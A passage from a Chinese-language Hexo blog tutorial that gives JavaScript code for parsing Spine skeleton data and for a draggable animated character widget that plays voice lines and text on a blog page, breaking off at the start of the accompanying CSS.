&#123;&#125;;</span><br><span class="line">                        <span class="keyword">const</span> slotIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                        offsetMap.slot = <span class="built_in">this</span>.json.slots[slotIndex].name;</span><br><span class="line">                        <span class="keyword">let</span> dooffset = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                        offsetMap.offset = dooffset;</span><br><span class="line">                        offsets[ii] = offsetMap;</span><br><span class="line">                    &#125;</span><br><span class="line">                    drawOrderMap.offsets = offsets;</span><br><span class="line">                    drawOrderMap.time = time;</span><br><span class="line">                    drawOrders[i] = drawOrderMap;</span><br><span class="line">                &#125;</span><br><span class="line">                duration = <span class="built_in">Math</span>.max(duration, drawOrders[drawOrderCount - <span class="number">0x1</span>].time);</span><br><span class="line">                animation.drawOrder = drawOrders;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> eventCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">            <span class="keyword">if</span> (eventCount &gt; <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> events = <span class="keyword">new</span> <span class="built_in">Array</span>(eventCount);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; eventCount; i++) &#123;</span><br><span class="line">                    <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    <span class="keyword">const</span> name = <span class="built_in">this</span>.json.eventsName[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                    <span class="keyword">const</span> eventData = <span class="built_in">this</span>.json.events[name];</span><br><span class="line">                    <span class="keyword">const</span> e = &#123;&#125;;</span><br><span class="line">                    e.name = name;</span><br><span class="line">                    e.int = <span class="built_in">this</span>.readInt(![]);</span><br><span class="line">                    e.float = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    e.string = <span class="built_in">this</span>.readBoolean() ? <span class="built_in">this</span>.readString() : eventData.string;</span><br><span class="line">                    e.time = time;</span><br><span class="line">                    events[i] = e;</span><br><span class="line">                &#125;</span><br><span class="line">                duration = <span class="built_in">Math</span>.max(duration, events[eventCount - <span class="number">0x1</span>].time);</span><br><span class="line">                animation.events = events;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> animation;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> SkeletonJsonConverter;</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;)(spine);</span><br></pre></td></tr></table></figure><h1 id="控制spine代码"><a href="#控制spine代码" class="headerlink" title="控制spine代码"></a>控制spine代码</h1><p>这部分是我们可以用来控制具体行为的代码，随便魔改hhh。</p><h2 id="myspine-js"><a href="#myspine-js" class="headerlink" title="myspine.js"></a>myspine.js</h2><p>将以下代码保存为<code>myspine.js</code>，放在<strong>主题文件的源目录</strong>的<code>source/js/third-party/myspine</code>路径下。</p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102201351068.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MySpine</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.config = t,</span><br><span class="line">    <span class="built_in">this</span>.model = t.models[<span class="built_in">Number</span>.parseInt(<span class="built_in">Math</span>.random()*t.models.length)],</span><br><span class="line">    <span class="built_in">this</span>.urlPrefix = t.spineDir + <span class="built_in">this</span>.model.name,</span><br><span class="line">    <span class="built_in">this</span>.skin = <span class="built_in">this</span>.model.skin,</span><br><span class="line">    <span class="built_in">this</span>.skeleton = <span class="built_in">this</span>.urlPrefix + <span class="built_in">this</span>.model.skeleton,</span><br><span class="line">    <span class="built_in">this</span>.atlas = <span class="built_in">this</span>.urlPrefix + <span class="built_in">this</span>.model.atlas,</span><br><span class="line">    <span class="built_in">this</span>.widget = <span class="literal">null</span>,</span><br><span class="line">    <span class="built_in">this</span>.widgetContainer = <span class="built_in">document</span>.querySelector(<span class="string">&quot;.myspine-spine-widget&quot;</span>),</span><br><span class="line">    <span class="built_in">this</span>.voiceText = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>),</span><br><span class="line">    <span class="built_in">this</span>.voicePlayer = <span class="keyword">new</span> Audio,</span><br><span class="line">    <span class="built_in">this</span>.triggerEvents = [<span class="string">&quot;mousedown&quot;</span>, <span class="string">&quot;touchstart&quot;</span>, <span class="string">&quot;scroll&quot;</span>],</span><br><span class="line">    <span class="built_in">this</span>.animationQueue = <span class="keyword">new</span> <span class="built_in">Array</span>,</span><br><span class="line">    <span class="built_in">this</span>.isPlayingVoice = !<span class="number">1</span>,</span><br><span class="line">    <span class="built_in">this</span>.lastInteractTime = <span class="built_in">Date</span>.now(),</span><br><span class="line">    <span class="built_in">this</span>.localX = <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">this</span>.localY = <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">this</span>.load()</span><br><span class="line">&#125;</span><br><span class="line">MySpine.downloadBinary = <span class="function"><span class="keyword">function</span>(<span class="params">t, e, i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="keyword">new</span> XMLHttpRequest;</span><br><span class="line">    n.open(<span class="string">&quot;GET&quot;</span>, t, !<span class="number">0</span>),</span><br><span class="line">    n.responseType = <span class="string">&quot;arraybuffer&quot;</span>,</span><br><span class="line">    n.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="number">200</span> == n.status ? e(<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(n.response)) : i(n.status, n.responseText)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    n.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        i(n.status, n.responseText)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    n.send()</span><br><span class="line">&#125;</span><br><span class="line">,</span><br><span class="line">MySpine.prototype = &#123;</span><br><span class="line">    load: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> i = <span class="built_in">this</span>.config;</span><br><span class="line">        MySpine.downloadBinary(<span class="built_in">this</span>.skeleton, <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">t, e</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> e)</span><br><span class="line">                    t.style.setProperty(i, e[i])</span><br><span class="line">            &#125;</span><br><span class="line">            e(<span class="built_in">this</span>.widgetContainer, i.styles.widget),</span><br><span class="line">            e(<span class="built_in">this</span>.voiceText, i.styles.voiceText);</span><br><span class="line">            t = <span class="keyword">new</span> spine.SkeletonJsonConverter(t,<span class="number">1</span>);</span><br><span class="line">            t.convertToJson(),</span><br><span class="line">            <span class="keyword">new</span> spine.SpineWidget(<span class="built_in">this</span>.widgetContainer,&#123;</span><br><span class="line">                animation: <span class="built_in">this</span>.getAnimationList(<span class="string">&quot;start&quot;</span>)[<span class="number">0</span>].name,</span><br><span class="line">                skin: <span class="built_in">this</span>.skin,</span><br><span class="line">                atlas: <span class="built_in">this</span>.atlas,</span><br><span class="line">                jsonContent: t.json,</span><br><span class="line">                backgroundColor: <span class="string">&quot;#00000000&quot;</span>,</span><br><span class="line">                loop: !<span class="number">1</span>,</span><br><span class="line">                success: <span class="built_in">this</span>.spineWidgetSuccessCallback.bind(<span class="built_in">this</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        , <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.error(<span class="string">`Couldn&#x27;t download skeleton <span class="subst">$&#123;path&#125;</span>: status <span class="subst">$&#123;t&#125;</span>, <span class="subst">$&#123;e&#125;</span>.`</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    spineWidgetSuccessCallback: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.triggerEvents.forEach(<span class="function"><span class="params">t</span>=&gt;</span><span class="built_in">window</span>.removeEventListener(t, e)),</span><br><span class="line">            <span class="built_in">this</span>.triggerEvents.forEach(<span class="function"><span class="params">t</span>=&gt;</span><span class="built_in">window</span>.addEventListener(t, <span class="built_in">this</span>.changeIdleAnimation.bind(<span class="built_in">this</span>))),</span><br><span class="line">            <span class="built_in">this</span>.initVoiceComponents(),</span><br><span class="line">            <span class="built_in">this</span>.initWidgetActions(),</span><br><span class="line">            <span class="built_in">this</span>.initDragging(),</span><br><span class="line">            <span class="built_in">this</span>.widget.play(),</span><br><span class="line">            <span class="built_in">this</span>.playVoice(<span class="built_in">this</span>.getVoice(<span class="string">&quot;start&quot;</span>)),</span><br><span class="line">            <span class="built_in">this</span>.widgetContainer.style.display = <span class="string">&quot;block&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        <span class="built_in">this</span>.widget = t,</span><br><span class="line">        <span class="built_in">this</span>.widget.pause(),</span><br><span class="line">        <span class="built_in">this</span>.widgetContainer.style.display = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">        <span class="built_in">this</span>.triggerEvents.forEach(<span class="function"><span class="params">t</span>=&gt;</span><span class="built_in">window</span>.addEventListener(t, e))</span><br><span class="line">    &#125;,</span><br><span class="line">    initVoiceComponents: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.voiceText.setAttribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;myspine-voice-text&quot;</span>),</span><br><span class="line">        <span class="built_in">this</span>.widgetContainer.appendChild(<span class="built_in">this</span>.voiceText),</span><br><span class="line">        <span class="built_in">this</span>.voiceText.style.opacity = <span class="number">0</span>,</span><br><span class="line">        <span class="built_in">this</span>.voicePlayer.addEventListener(<span class="string">&quot;timeupdate&quot;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.voiceText.scrollTo(&#123;</span><br><span class="line">                left: <span class="number">0</span>,</span><br><span class="line">                top: <span class="built_in">this</span>.voiceText.offsetHeight * (<span class="built_in">this</span>.voicePlayer.currentTime / <span class="built_in">this</span>.voicePlayer.duration),</span><br><span class="line">                behavior: <span class="string">&quot;smooth&quot;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="built_in">this</span>.voicePlayer.addEventListener(<span class="string">&quot;ended&quot;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.voiceText.style.opacity = <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">this</span>.isPlayingVoice = !<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;,</span><br><span class="line">    initWidgetActions: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.widget.canvas.onclick = <span class="built_in">this</span>.interact.bind(<span class="built_in">this</span>),</span><br><span class="line">        <span class="built_in">this</span>.widget.state.addListener(&#123;</span><br><span class="line">            complete: <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">                (<span class="built_in">this</span>.isPlayingVoice &amp;&amp; t.loop) || <span class="built_in">this</span>.isIdle() ? <span class="built_in">this</span>.playRandAnimation(&#123;</span><br><span class="line">                    name: t.animation.name,</span><br><span class="line">                    loop: !<span class="number">0</span></span><br><span class="line">                &#125;) : <span class="built_in">this</span>.playRandAnimation(<span class="built_in">this</span>.getAnimationList(<span class="string">&quot;idle&quot;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    initDragging: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="built_in">document</span>.documentElement.scrollLeft</span><br><span class="line">              , i = <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">            <span class="keyword">return</span> t.targetTouches ? (e += t.targetTouches[<span class="number">0</span>].clientX,</span><br><span class="line">            i += t.targetTouches[<span class="number">0</span>].clientY) : t.clientX &amp;&amp; t.clientY &amp;&amp; (e += t.clientX,</span><br><span class="line">            i += t.clientY),</span><br><span class="line">            &#123;</span><br><span class="line">                x: e,</span><br><span class="line">                y: i</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">            t.cancelable &amp;&amp; t.preventDefault()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> n = <span class="function">(<span class="params">t,e</span>)=&gt;</span>&#123;</span><br><span class="line">            t = <span class="built_in">Math</span>.max(<span class="number">0</span>, t),</span><br><span class="line">            e = <span class="built_in">Math</span>.max(<span class="number">0</span>, e),</span><br><span class="line">            t = <span class="built_in">Math</span>.min(<span class="built_in">document</span>.body.clientWidth - <span class="built_in">this</span>.widgetContainer.clientWidth, t),</span><br><span class="line">            e = <span class="built_in">Math</span>.min(<span class="built_in">document</span>.body.clientHeight - <span class="built_in">this</span>.widgetContainer.clientHeight, e),</span><br><span class="line">            <span class="built_in">this</span>.widgetContainer.style.left = t + <span class="string">&quot;px&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.widgetContainer.style.top = e + <span class="string">&quot;px&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">          , o = <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> &#123;<span class="attr">x</span>: e, <span class="attr">y</span>: t&#125; = i(t);</span><br><span class="line">            <span class="built_in">this</span>.localX = e - <span class="built_in">this</span>.widgetContainer.offsetLeft,</span><br><span class="line">            <span class="built_in">this</span>.localY = t - <span class="built_in">this</span>.widgetContainer.offsetTop</span><br><span class="line">        &#125;</span><br><span class="line">          , s = <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> &#123;<span class="attr">x</span>: e, <span class="attr">y</span>: t&#125; = i(t);</span><br><span class="line">            n(e - <span class="built_in">this</span>.localX, t - <span class="built_in">this</span>.localY),</span><br><span class="line">            <span class="built_in">window</span>.getSelection ? <span class="built_in">window</span>.getSelection().removeAllRanges() : <span class="built_in">document</span>.selection.empty()</span><br><span class="line">        &#125;</span><br><span class="line">          , t = &#123;</span><br><span class="line">            passive: !<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">          , a = &#123;</span><br><span class="line">            passive: !<span class="number">1</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">this</span>.widgetContainer.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">            o(t),</span><br><span class="line">            <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, s)</span><br><span class="line">        &#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="built_in">this</span>.widgetContainer.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">            o(t),</span><br><span class="line">            <span class="built_in">document</span>.addEventListener(<span class="string">&quot;touchmove&quot;</span>, e, a)</span><br><span class="line">        &#125;</span><br><span class="line">        , t),</span><br><span class="line">        <span class="built_in">this</span>.widgetContainer.addEventListener(<span class="string">&quot;touchmove&quot;</span>, s, t),</span><br><span class="line">        <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, <span class="function">()=&gt;</span><span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, s)),</span><br><span class="line">        <span class="built_in">this</span>.widgetContainer.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">()=&gt;</span><span class="built_in">document</span>.removeEventListener(<span class="string">&quot;touchmove&quot;</span>, e)),</span><br><span class="line">        <span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> t = <span class="built_in">this</span>.widgetContainer.style;</span><br><span class="line">            <span class="keyword">var</span> e, i;</span><br><span class="line">            t.left &amp;&amp; t.top &amp;&amp; (e = <span class="built_in">Number</span>.parseInt(t.left.substring(<span class="number">0</span>, t.left.length - <span class="number">2</span>)),</span><br><span class="line">            i = <span class="built_in">Number</span>.parseInt(t.top.substring(<span class="number">0</span>, t.top.length - <span class="number">2</span>)),</span><br><span class="line">            n(e, i))</span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;,</span><br><span class="line">    interact: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.isPlayingVoice || <span class="number">0</span> &lt; <span class="built_in">this</span>.animationQueue.length || !<span class="built_in">this</span>.isIdle() ? <span class="built_in">console</span>.warn(<span class="string">&quot;互动过于频繁！&quot;</span>) : (<span class="built_in">this</span>.lastInteractTime = <span class="built_in">Date</span>.now(),</span><br><span class="line">        <span class="built_in">this</span>.playRandAnimation(<span class="built_in">this</span>.getAnimationList(<span class="string">&quot;interact&quot;</span>)),</span><br><span class="line">        <span class="built_in">this</span>.playVoice(<span class="built_in">this</span>.getVoice(<span class="string">&quot;interact&quot;</span>)))</span><br><span class="line">    &#125;,</span><br><span class="line">    getUrl: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.urlPrefix + t</span><br><span class="line">    &#125;,</span><br><span class="line">    getAnimationList: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="built_in">this</span>.config.behaviors[t];</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;start&quot;</span> == t? [&#123;</span><br><span class="line">            name: e.animation,</span><br><span class="line">            loop: !<span class="number">1</span></span><br><span class="line">        &#125;] : e.animations.slice()</span><br><span class="line">    &#125;,</span><br><span class="line">    getVoice: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="built_in">this</span>.config.behaviors[t];</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;start&quot;</span> == t? &#123;</span><br><span class="line">            voice: e.voice,</span><br><span class="line">            text: e.text</span><br><span class="line">        &#125; : e.voices[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * e.voices.length)]</span><br><span class="line">    &#125;,</span><br><span class="line">    playRandAnimation: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(t)) &#123;</span><br><span class="line">            e = t[<span class="built_in">Number</span>.parseInt(<span class="built_in">Math</span>.random()*t.length)];</span><br><span class="line">            <span class="built_in">this</span>.widget.state.setAnimation(<span class="number">0</span>, e.name, e.loop);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.widget.state.setAnimation(<span class="number">0</span>, t.name, t.loop);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    playVoice: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        voiceUrl = <span class="built_in">this</span>.getUrl(t.voice);</span><br><span class="line">        <span class="comment">// 如果为空则播放五秒的空语音，仅用来显示文本框</span></span><br><span class="line">        <span class="keyword">if</span> (voiceUrl == <span class="built_in">this</span>.urlPrefix) &#123;</span><br><span class="line">            voiceUrl = <span class="built_in">this</span>.config.spineDir + <span class="string">&quot;default.mp3&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        t &amp;&amp; (<span class="built_in">this</span>.isPlayingVoice = !<span class="number">0</span>,</span><br><span class="line">        <span class="built_in">this</span>.voicePlayer.src = voiceUrl,</span><br><span class="line">        <span class="built_in">this</span>.voicePlayer.load(),</span><br><span class="line">        <span class="built_in">this</span>.voicePlayer.play().then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.voiceText.innerHTML = t.text,</span><br><span class="line">            <span class="built_in">this</span>.voiceText.scrollTo(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">            <span class="built_in">this</span>.voiceText.style.opacity = <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        , <span class="function"><span class="params">t</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.isPlayingVoice = !<span class="number">1</span>,</span><br><span class="line">            <span class="built_in">console</span>.error(<span class="string">`无法播放音频，因为：<span class="subst">$&#123;t&#125;</span>`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ))</span><br><span class="line">    &#125;,</span><br><span class="line">    isIdle: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="built_in">this</span>.widget.state.tracks[<span class="number">0</span>].animation;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> <span class="built_in">this</span>.getAnimationList(<span class="string">&quot;idle&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v.name == e.name) &#123;</span><br><span class="line">                <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    isInteract: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="built_in">this</span>.widget.state.tracks[<span class="number">0</span>].animation;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> <span class="built_in">this</span>.getAnimationList(<span class="string">&quot;interact&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v.name == e.name) &#123;</span><br><span class="line">                <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    changeIdleAnimation: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> t = <span class="built_in">Date</span>.now()</span><br><span class="line">          , e = t - <span class="built_in">this</span>.lastInteractTime;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.isIdle() &amp;&amp; e/<span class="number">1e3</span>/<span class="number">60</span> &gt;= <span class="built_in">this</span>.config.behaviors.idle.maxMinutes) || </span><br><span class="line">            (<span class="built_in">this</span>.isInteract() &amp;&amp; e/<span class="number">1e3</span> &gt;= <span class="built_in">this</span>.config.behaviors.interact.maxPlaySec)) &#123;</span><br><span class="line">             <span class="built_in">this</span>.lastInteractTime = t,</span><br><span class="line">             <span class="built_in">this</span>.playRandAnimation(<span class="built_in">this</span>.getAnimationList(<span class="string">&quot;idle&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="myspine-css"><a href="#myspine-css" class="headerlink" title="myspine.css"></a>myspine.css</h2><p>将以下代码保存为<code>myspine.css</code>，放在<strong>主题文件的源目录</strong>的<code>source/css/_third-party</code>路径下。</p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102201924645.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 